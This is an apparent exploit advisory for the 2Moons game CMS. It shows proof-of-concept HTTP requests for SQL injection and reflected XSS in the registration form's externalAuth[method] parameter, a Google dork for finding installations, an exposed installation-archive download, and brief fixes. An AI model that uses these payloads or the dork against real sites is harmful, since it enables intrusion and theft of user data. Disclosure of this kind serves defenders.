@@ -1,0 +1,75 @@
+# Title: 2Moons - Multiple Vulnerabilities
+# Date: 08-07-2015
+# Author: bRpsd (skype: vegnox)
+# Vendor: 2Moons
+# Vendor HomePage: http://2moons.cc/
+# CMS Download: https://github.com/jkroepke/2Moons
+# Google Dork: intext:Powered by 2Moons 2009-2013
+# Affected Versions: All Current Versions.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+#1 SQL Injection:
+Page: index.php?action=register
+Parameter: externalAuth[method]
+
+## Proof Of Concept ##
+
+HTTP REQUEST:
+
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/pentest/scripts/2Moons-master/index.php?page=register
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+mode=send&externalAuth%5Baccount%5D=0&externalAuth%5Bmethod%5D=1'&referralID=0&uni=1&username=&password=&passwordReplay=&email=&emailReplay=&lang=en
+
+
+
+RESPONSE (200):
+MySQL Error :
+INSERT INTO uni1_users_valid SET `userName` = 'ttttttttt0', `validationKey` = '3126764a7b1875fc95c59ab0e4524818', `password` = '$2a$09$YdlOfJ0DB67Xc4IUuR9yi.ocwBEhJJItwRGqVWzFgbjSTAS.YiAyG', `email` = 'DDDDDDDDD@cc.com', `date` = '1437990463', `ip` = '::1', `language` = 'en', `universe` = 1, `referralID` = 0, `externalAuthUID` = '0', `externalAuthMethod` = '1'';
+
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+#2 Reflected Cross Site Scripting :
+
+HTTP REQUEST:
+
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/pentest/scripts/2Moons-master/index.php?page=register
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+mode=send&externalAuth%5Baccount%5D=0&externalAuth%5Bmethod%5D=1'"></><script>alert('test')</script>&referralID=0&uni=1&username=&password=&passwordReplay=&email=&emailReplay=&lang=en
+
+
+
+RESPONSE (200):
+MySQL Error :
+INSERT INTO uni1_users_valid SET `userName` = 'ttttttttt0', `validationKey` = '3126764a7b1875fc95c59ab0e4524818', `password` = '$2a$09$YdlOfJ0DB67Xc4IUuR9yi.ocwBEhJJItwRGqVWzFgbjSTAS.YiAyG', `email` = 'DDDDDDDDD@cc.com', `date` = '1437990463', `ip` = '::1', `language` = 'en', `universe` = 1, `referralID` = 0, `externalAuthUID` = '0', `externalAuthMethod` = '1'';(XSS HERE)
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+#3 Arbitrary File Download :
+Some Admins Forget To Delete This File Which Includes DB Information.
+http://localhost/2Moons-master.zip
+
+
+
+
+## Solutions ## :
+** Dont keep any installation files, erase them ** 
+** Remove the externalAuthMethod Permanently **
+** No solution yet from vendor **
+//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\
+//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\ 		 	   		  
